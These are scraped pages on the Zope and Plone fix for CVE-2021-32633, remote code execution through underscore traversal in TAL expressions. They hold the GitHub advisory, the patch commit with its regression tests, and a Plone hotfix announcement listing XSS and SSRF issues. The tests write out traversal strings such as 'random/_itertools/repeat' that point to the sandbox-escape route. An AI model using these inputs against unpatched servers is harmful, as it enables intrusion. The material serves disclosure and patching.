=== Content from github.com_0ec6241c_20250114_184254.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fzopefoundation%2FZope%2Fsecurity%2Fadvisories%2FGHSA-5pr9-v234-jw36)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fzopefoundation%2FZope%2Fsecurity%2Fadvisories%2FGHSA-5pr9-v234-jw36)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=zopefoundation%2FZope)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[zopefoundation](/zopefoundation)
/
**[Zope](/zopefoundation/Zope)**
Public

* [Notifications](/login?return_to=%2Fzopefoundation%2FZope) You must be signed in to change notification settings
* [Fork
  101](/login?return_to=%2Fzopefoundation%2FZope)
* [Star
   358](/login?return_to=%2Fzopefoundation%2FZope)

* [Code](/zopefoundation/Zope)
* [Issues
  29](/zopefoundation/Zope/issues)
* [Pull requests
  1](/zopefoundation/Zope/pulls)
* [Actions](/zopefoundation/Zope/actions)
* [Projects
  0](/zopefoundation/Zope/projects)
* [Security](/zopefoundation/Zope/security)
* [Insights](/zopefoundation/Zope/pulse)

Additional navigation options

* [Code](/zopefoundation/Zope)
* [Issues](/zopefoundation/Zope/issues)
* [Pull requests](/zopefoundation/Zope/pulls)
* [Actions](/zopefoundation/Zope/actions)
* [Projects](/zopefoundation/Zope/projects)
* [Security](/zopefoundation/Zope/security)
* [Insights](/zopefoundation/Zope/pulse)

# Remote Code Execution via traversal in TAL expressions

High

[dataflake](/dataflake)
published
GHSA-5pr9-v234-jw36
May 21, 2021

## Package

Zope

## Affected versions

< 5.2, <4.6

## Patched versions

5.2, 4.6

## Description

### Impact

Most Python modules are not available for using in TAL expressions that you can add through-the-web, for example in Zope Page Templates. This restriction avoids file system access, for example via the 'os' module. But some of the untrusted modules are available indirectly through Python modules that are available for direct use.

By default, you need to have the Manager role to add or edit Zope Page Templates through the web. Only sites that allow untrusted users to add/edit Zope Page Templates through the web are at risk.

### Patches

The problem has been fixed in Zope 5.2 and 4.6.

### Workarounds

A site administrator can restrict adding/editing Zope Page Templates through the web using the standard Zope user/role permission mechanisms. Untrusted users should not be assigned the Zope Manager role and adding/editing Zope Page Templates through the web should be restricted to trusted users only.

### For more information

If you have any questions or comments about this advisory:

* Open an issue in the [Zope issue tracker](https://github.com/zopefoundation/Zope/issues)
* Email us at security@plone.org

### Severity

High

### CVE ID

CVE-2021-32633

### Weaknesses

No CWEs

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_8a216be7_20250114_184254.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fzopefoundation%2FZope%2Fcommit%2F1f8456bf1f908ea46012537d52bd7e752a532c91)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fzopefoundation%2FZope%2Fcommit%2F1f8456bf1f908ea46012537d52bd7e752a532c91)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=zopefoundation%2FZope)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[zopefoundation](/zopefoundation)
/
**[Zope](/zopefoundation/Zope)**
Public

* [Notifications](/login?return_to=%2Fzopefoundation%2FZope) You must be signed in to change notification settings
* [Fork
  101](/login?return_to=%2Fzopefoundation%2FZope)
* [Star
   358](/login?return_to=%2Fzopefoundation%2FZope)

* [Code](/zopefoundation/Zope)
* [Issues
  29](/zopefoundation/Zope/issues)
* [Pull requests
  1](/zopefoundation/Zope/pulls)
* [Actions](/zopefoundation/Zope/actions)
* [Projects
  0](/zopefoundation/Zope/projects)
* [Security](/zopefoundation/Zope/security)
* [Insights](/zopefoundation/Zope/pulse)

Additional navigation options

* [Code](/zopefoundation/Zope)
* [Issues](/zopefoundation/Zope/issues)
* [Pull requests](/zopefoundation/Zope/pulls)
* [Actions](/zopefoundation/Zope/actions)
* [Projects](/zopefoundation/Zope/projects)
* [Security](/zopefoundation/Zope/security)
* [Insights](/zopefoundation/Zope/pulse)

## Commit

[Permalink](/zopefoundation/Zope/commit/1f8456bf1f908ea46012537d52bd7e752a532c91)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Merge pull request from [GHSA-5pr9-v234-jw36](https://github.com/advisories/GHSA-5pr9-v234-jw36 "GHSA-5pr9-v234-jw36")

[Browse files](/zopefoundation/Zope/tree/1f8456bf1f908ea46012537d52bd7e752a532c91)
Browse the repository at this point in the history

```
* - Prevent traversal to names starting with ``_`` in TAL expressions

* - include the expressions module

* - simplify test

* - lint fix

* - add DeprecationWarnings for traversal to `_`

* Update src/Products/PageTemplates/tests/testChameleonTalesExpressions.py

Co-authored-by: Michael Howitz <mh@gocept.com>

* - add missing import

* - added tests for the ``traverse`` method fix

* - change control flow

Co-authored-by: Michael Howitz <mh@gocept.com>
```

* Loading branch information

[![@dataflake](https://avatars.githubusercontent.com/u/1215784?s=40&v=4)](/dataflake)

[dataflake](/zopefoundation/Zope/commits?author=dataflake "View all commits by dataflake")
and
Michael Howitz
authored
May 21, 2021

1 parent
[1746d5a](/zopefoundation/Zope/commit/1746d5affee450a6b95262ce217fd80328e4c62c)

commit 1f8456b

 Show file tree

 Hide file tree

Showing
**8 changed files**
with
**84 additions**
and
**2 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* CHANGES.rst
  [CHANGES.rst](#diff-ff3c479edefad986d2fe6fe7ead575a46b086e3bbcf0ccc86d85efc4a4c63c79)
* src/Products/PageTemplates

  + src/Products/PageTemplates/Expressions.py
    [Expressions.py](#diff-8670874f164d64ebf7dc9facac82c8c209af956bc1d3b09b2c86ec1aa342508b)
  + src/Products/PageTemplates/expression.py
    [expression.py](#diff-3da8f032f79b08bf7db4fcf72a5190c7117a76bf83ca78ffa12c85e64ad6b2f2)
  + tests

    - input

      * src/Products/PageTemplates/tests/input/CheckPathTraverse.html
        [CheckPathTraverse.html](#diff-2353ba3e5ba662f2892f65f975ba1d569515d8c72f4b8424b15572f4b922ff8c)
    - output

      * src/Products/PageTemplates/tests/output/CheckPathTraverse.html
        [CheckPathTraverse.html](#diff-cd37fe5773d1c13e73d09c0954867db2c3c322903c4b83cdf00393b1257df3ef)
    - src/Products/PageTemplates/tests/testChameleonTalesExpressions.py
      [testChameleonTalesExpressions.py](#diff-6199fbf2bd5541d4e6f67e4364aaefd17e36bcbb611a49467a380aa1a5a6e0bf)
    - src/Products/PageTemplates/tests/testExpressions.py
      [testExpressions.py](#diff-2afe32443e343e0650a884c051bbb69c5a1f0128692522e017bebb7e71660907)
    - src/Products/PageTemplates/tests/testHTMLTests.py
      [testHTMLTests.py](#diff-3840669f3b566e6d6ce36734affbaa4d0837ab68469371cea4c84cac1d4c9818)

## There are no files selected for viewing

3 changes: 3 additions & 0 deletions

3
[CHANGES.rst](#diff-ff3c479edefad986d2fe6fe7ead575a46b086e3bbcf0ccc86d85efc4a4c63c79 "CHANGES.rst")

Show comments

[View file](/zopefoundation/Zope/blob/1f8456bf1f908ea46012537d52bd7e752a532c91/CHANGES.rst)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |

| Expand Up | | @@ -11,6 +11,9 @@ https://github.com/zopefoundation/Zope/blob/4.x/CHANGES.rst |
|  |  | 5.2 (unreleased) |
|  |  | ---------------- |
|  |  |  |
|  |  | - Prevent traversal to names starting with ``\_`` in TAL expressions |
|  |  | and fix path expressions for the ``chameleon.tales`` expression engine. |
|  |  |  |
|  |  | - Provide friendlier ZMI error message for the Transaction Undo form |
|  |  | (`#964 <https://github.com/zopefoundation/Zope/issues/964>`\_) |
|  |  |  |
| Expand Down | |  |

9 changes: 9 additions & 0 deletions

9
[src/Products/PageTemplates/Expressions.py](#diff-8670874f164d64ebf7dc9facac82c8c209af956bc1d3b09b2c86ec1aa342508b "src/Products/PageTemplates/Expressions.py")

Show comments

[View file](/zopefoundation/Zope/blob/1f8456bf1f908ea46012537d52bd7e752a532c91/src/Products/PageTemplates/Expressions.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -17,6 +17,7 @@ |
|  |  | """ |
|  |  |  |
|  |  | import logging |
|  |  | import warnings |
|  |  |  |
|  |  | import OFS.interfaces |
|  |  | from AccessControl import safe\_builtins |
| Expand Down  Expand Up | | @@ -74,6 +75,14 @@ def boboAwareZopeTraverse(object, path\_items, econtext): |
|  |  |  |
|  |  | while path\_items: |
|  |  | name = path\_items.pop() |
|  |  |  |
|  |  | if name == '\_': |
|  |  | warnings.warn('Traversing to the name `\_` is deprecated ' |
|  |  | 'and will be removed in Zope 6.', |
|  |  | DeprecationWarning) |
|  |  | elif name.startswith('\_'): |
|  |  | raise NotFound(name) |
|  |  |  |
|  |  | if OFS.interfaces.ITraversable.providedBy(object): |
|  |  | object = object.restrictedTraverse(name) |
|  |  | else: |
| Expand Down | |  |

11 changes: 10 additions & 1 deletion

11
[src/Products/PageTemplates/expression.py](#diff-3da8f032f79b08bf7db4fcf72a5190c7117a76bf83ca78ffa12c85e64ad6b2f2 "src/Products/PageTemplates/expression.py")

Show comments

[View file](/zopefoundation/Zope/blob/1f8456bf1f908ea46012537d52bd7e752a532c91/src/Products/PageTemplates/expression.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,5 +1,6 @@ |
|  |  | """``chameleon.tales`` expressions.""" |
|  |  |  |
|  |  | import warnings |
|  |  | from ast import NodeTransformer |
|  |  | from ast import parse |
|  |  |  |
| Expand Down  Expand Up | | @@ -61,8 +62,16 @@ def traverse(cls, base, request, path\_items): |
|  |  |  |
|  |  | while path\_items: |
|  |  | name = path\_items.pop() |
|  |  |  |
|  |  | if name == '\_': |
|  |  | warnings.warn('Traversing to the name `\_` is deprecated ' |
|  |  | 'and will be removed in Zope 6.', |
|  |  | DeprecationWarning) |
|  |  | elif name.startswith('\_'): |
|  |  | raise NotFound(name) |
|  |  |  |
|  |  | if ITraversable.providedBy(base): |
|  |  | base = getattr(base, cls.traverseMethod)(name) |
|  |  | base = getattr(base, cls.traverse\_method)(name) |
|  |  | else: |
|  |  | base = traversePathElement(base, name, path\_items, |
|  |  | request=request) |
| Expand Down | |  |

5 changes: 5 additions & 0 deletions

5
[src/Products/PageTemplates/tests/input/CheckPathTraverse.html](#diff-2353ba3e5ba662f2892f65f975ba1d569515d8c72f4b8424b15572f4b922ff8c "src/Products/PageTemplates/tests/input/CheckPathTraverse.html")

Show comments

[View file](/zopefoundation/Zope/blob/1f8456bf1f908ea46012537d52bd7e752a532c91/src/Products/PageTemplates/tests/input/CheckPathTraverse.html)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,5 @@ |
|  |  | <html> |
|  |  | <body> |
|  |  | <div tal:content="context/laf"></div> |
|  |  | </body> |
|  |  | </html> |

5 changes: 5 additions & 0 deletions

5
[src/Products/PageTemplates/tests/output/CheckPathTraverse.html](#diff-cd37fe5773d1c13e73d09c0954867db2c3c322903c4b83cdf00393b1257df3ef "src/Products/PageTemplates/tests/output/CheckPathTraverse.html")

Show comments

[View file](/zopefoundation/Zope/blob/1f8456bf1f908ea46012537d52bd7e752a532c91/src/Products/PageTemplates/tests/output/CheckPathTraverse.html)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,5 @@ |
|  |  | <html> |
|  |  | <body> |
|  |  | <div>ok</div> |
|  |  | </body> |
|  |  | </html> |

7 changes: 7 additions & 0 deletions

7
[src/Products/PageTemplates/tests/testChameleonTalesExpressions.py](#diff-6199fbf2bd5541d4e6f67e4364aaefd17e36bcbb611a49467a380aa1a5a6e0bf "src/Products/PageTemplates/tests/testChameleonTalesExpressions.py")

Show comments

[View file](/zopefoundation/Zope/blob/1f8456bf1f908ea46012537d52bd7e752a532c91/src/Products/PageTemplates/tests/testChameleonTalesExpressions.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,3 +1,5 @@ |
|  |  | import unittest |
|  |  |  |
|  |  | from ..expression import getEngine |
|  |  | from . import testHTMLTests |
|  |  |  |
| Expand All | | @@ -19,3 +21,8 @@ def setUp(self): |
|  |  | # expressions (e.g. the ``zope.tales`` ``not`` expression |
|  |  | # returns ``int``, that of ``chameleon.tales`` ``bool`` |
|  |  | PREFIX = "CH\_" |
|  |  |  |
|  |  | @unittest.skip('The test in the base class relies on a Zope context with' |
|  |  | ' the "random" module available in expressions') |
|  |  | def test\_underscore\_traversal(self): |
|  |  | pass |

21 changes: 20 additions & 1 deletion

21
[src/Products/PageTemplates/tests/testExpressions.py](#diff-2afe32443e343e0650a884c051bbb69c5a1f0128692522e017bebb7e71660907 "src/Products/PageTemplates/tests/testExpressions.py")

Show comments

[View file](/zopefoundation/Zope/blob/1f8456bf1f908ea46012537d52bd7e752a532c91/src/Products/PageTemplates/tests/testExpressions.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,6 +1,8 @@ |
|  |  | import unittest |
|  |  | import warnings |
|  |  |  |
|  |  | from AccessControl import safe\_builtins |
|  |  | from zExceptions import NotFound |
|  |  | from zope.component.testing import PlacelessSetup |
|  |  |  |
|  |  |  |
| Expand Down  Expand Up | | @@ -106,8 +108,12 @@ def test\_evaluate\_alternative\_first\_missing(self): |
|  |  | self.assertTrue(ec.evaluate('x | nothing') is None) |
|  |  |  |
|  |  | def test\_evaluate\_dict\_key\_as\_underscore(self): |
|  |  | # Traversing to the name `\_` will raise a DeprecationWarning |
|  |  | # because it will go away in Zope 6. |
|  |  | ec = self.\_makeContext() |
|  |  | self.assertEqual(ec.evaluate('d/\_'), 'under') |
|  |  | with warnings.catch\_warnings(): |
|  |  | warnings.simplefilter('ignore') |
|  |  | self.assertEqual(ec.evaluate('d/\_'), 'under') |
|  |  |  |
|  |  | def test\_evaluate\_dict\_with\_key\_from\_expansion(self): |
|  |  | ec = self.\_makeContext() |
| Expand Down  Expand Up | | @@ -220,6 +226,19 @@ def test\_list\_in\_path\_expr(self): |
|  |  | ec = self.\_makeContext() |
|  |  | self.assertIs(ec.evaluate('nocall: list'), safe\_builtins["list"]) |
|  |  |  |
|  |  | def test\_underscore\_traversal(self): |
|  |  | # Prevent traversal to names starting with an underscore (\_) |
|  |  | ec = self.\_makeContext() |
|  |  |  |
|  |  | with self.assertRaises(NotFound): |
|  |  | ec.evaluate("context/\_\_class\_\_") |
|  |  |  |
|  |  | with self.assertRaises(NotFound): |
|  |  | ec.evaluate("nocall: random/\_itertools/repeat") |
|  |  |  |
|  |  | with self.assertRaises(NotFound): |
|  |  | ec.evaluate("random/\_itertools/repeat/foobar") |
|  |  |  |
|  |  |  |
|  |  | class TrustedEngineTests(EngineTestsBase, unittest.TestCase): |
|  |  |  |
| Expand Down | |  |

25 changes: 25 additions & 0 deletions

25
[src/Products/PageTemplates/tests/testHTMLTests.py](#diff-3840669f3b566e6d6ce36734affbaa4d0837ab68469371cea4c84cac1d4c9818 "src/Products/PageTemplates/tests/testHTMLTests.py")

Show comments

[View file](/zopefoundation/Zope/blob/1f8456bf1f908ea46012537d52bd7e752a532c91/src/Products/PageTemplates/tests/testHTMLTests.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -26,6 +26,7 @@ |
|  |  | DefaultUnicodeEncodingConflictResolver |
|  |  | from Products.PageTemplates.unicodeconflictresolver import \ |
|  |  | PreferredCharsetResolver |
|  |  | from zExceptions import NotFound |
|  |  | from zope.component import provideUtility |
|  |  | from zope.traversing.adapters import DefaultTraversable |
|  |  |  |
| Expand Down  Expand Up | | @@ -155,6 +156,15 @@ def testPathNothing(self): |
|  |  | def testPathAlt(self): |
|  |  | self.assert\_expected(self.folder.t, 'CheckPathAlt.html') |
|  |  |  |
|  |  | def testPathTraverse(self): |
|  |  | # need to perform this test with a "real" folder |
|  |  | from OFS.Folder import Folder |
|  |  | f = self.folder |
|  |  | self.folder = Folder() |
|  |  | self.folder.t, self.folder.laf = f.t, f.laf |
|  |  | self.folder.laf.write('ok') |
|  |  | self.assert\_expected(self.folder.t, 'CheckPathTraverse.html') |
|  |  |  |
|  |  | def testBatchIteration(self): |
|  |  | self.assert\_expected(self.folder.t, 'CheckBatchIteration.html') |
|  |  |  |
| Expand Down  Expand Up | | @@ -207,3 +217,18 @@ def test\_unicode\_conflict\_resolution(self): |
|  |  | provideUtility(PreferredCharsetResolver) |
|  |  | t = PageTemplate() |
|  |  | self.assert\_expected(t, 'UnicodeResolution.html') |
|  |  |  |
|  |  | def test\_underscore\_traversal(self): |
|  |  | t = self.folder.t |
|  |  |  |
|  |  | t.write('<p tal:define="p context/\_\_class\_\_" />') |
|  |  | with self.assertRaises(NotFound): |
|  |  | t() |
|  |  |  |
|  |  | t.write('<p tal:define="p nocall: random/\_itertools/repeat"/>') |
|  |  | with self.assertRaises(NotFound): |
|  |  | t() |
|  |  |  |
|  |  | t.write('<p tal:content="random/\_itertools/repeat/foobar"/>') |
|  |  | with self.assertRaises(NotFound): |
|  |  | t() |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `1f8456b`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fzopefoundation%2FZope%2Fcommit%2F1f8456bf1f908ea46012537d52bd7e752a532c91) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.openwall.com_c2f8b713_20250114_184252.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](../../../2021/05/19/2) [[next>]](../../../2021/05/22/1) [[thread-next>]](../../../2021/05/22/1) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <0919707c-0f29-ac46-35f5-d6890faf0f4e@vanrees.org>
Date: Fri, 21 May 2021 16:07:57 +0200
From: Maurits van Rees <maurits@...rees.org>
To: oss-security@...ts.openwall.com
Subject: Plone security hotfix 20210518

A Plone security hotfix was released on Tuesday, May 18 2021.
For details, see <https://plone.org/security/hotfix/20210518>
Most CVE numbers are not yet issued. I will request them from Mitre shortly.

BTW, I am following the instructions at
<https://oss-security.openwall.org/wiki/mailing-lists/oss-security#cve-requests>
to first post to this list, then request CVEs at Mitre, then reply to my
own post.
I don't see many other people doing it in this order. Is that page still
accurate?

Versions Affected: All supported Plone versions (4.3.20 and any earlier
4.3.x version, 5.2.4 and any earlier 5.x version).

Versions Not Affected: None. Earlier versions may be affected, but the
hotfix has not been tested on them.

The patch addresses several security issues:

- Remote Code Execution via traversal in expressions. Reported by David
Miller. CVE-2021-32633.
- Writing arbitrary files via docutils and Python Script. Reported by
Calum Hutton.
- Various information disclosures: mostly installation logs. Reported by
Calum Hutton. CVE-2021-21360 and CVE-2021-21336.
- Stored XSS from file upload (svg, html). Reported separately by Emir
Cüneyt Akkutlu and Tino Kautschke.
- Reflected XSS in various spots. Reported by Calum Hutton.
- XSS vulnerability in CMFDiffTool. Reported by Igor Margitich.
- Stored XSS from user fullname. Reported by Tino Kautschke.
- Blind SSRF via feedparser accessing an internal URL. Reported by
Subodh Kumar Shree.
- Server Side Request Forgery via event ical URL. Reported by MisakiKata
and David Miller.
- Server Side Request Forgery via lxml parser. Reported by MisakiKata
and David Miller.

A hotfix package has been created at
<https://pypi.org/project/Products.PloneHotfix20210518/>
The fixes will be incorporated in future release Plone 5.2.5.

--
